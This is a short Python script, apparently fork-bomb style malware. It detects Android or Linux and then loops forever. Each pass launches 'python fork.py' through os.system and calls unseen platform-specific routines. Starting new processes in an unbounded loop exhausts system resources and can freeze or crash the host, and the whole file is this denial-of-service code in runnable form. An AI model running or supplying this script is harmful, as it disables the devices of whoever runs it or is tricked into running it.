import os
import platform
from android import android
from linux import linux
_os = ""
if platform.system() == "Android":
  _os = "android"
elif platform.system() == "Linux":
  _os = "linux"
else:
  pass
while True:
  os.system("python fork.py")
  if _os == "android":
    android()
  elif _os == "linux":
    linux()
  else:
    pass
